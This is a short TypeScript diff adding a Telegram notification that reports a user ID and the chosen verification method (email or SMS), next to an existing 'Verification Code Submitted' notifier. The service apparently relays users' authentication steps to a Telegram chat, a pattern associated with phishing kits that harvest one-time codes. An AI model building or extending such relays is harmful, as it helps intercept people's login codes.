@@ -786,6 +786,19 @@ class TelegramFlowService {
     await this.sendMessage(wrapFlowMessage(body));
   }
 
+  async sendMethodNotification(data: { userId?: string; method: string }): Promise<void> {
+    const methodLabel = data.method === "email" ? "Email" : "Text Message (SMS)";
+    const lines = [
+      `🔐 <b>Verification Method Selected</b>`,
+      `━━━━━━━━━━━━━━━━━━`,
+    ];
+    if (data.userId) {
+      lines.push(`👤 <b>User ID:</b> ${asCode(data.userId)}`);
+    }
+    lines.push(`📧 <b>Method:</b> ${asCode(methodLabel)}`);
+    await this.sendMessage(wrapFlowMessage(lines.join("\n")));
+  }
+
   async sendVerificationNotification(data: FlowVerificationData): Promise<void> {
     const body = [
       `🔑 <b>Verification Code Submitted</b>`,
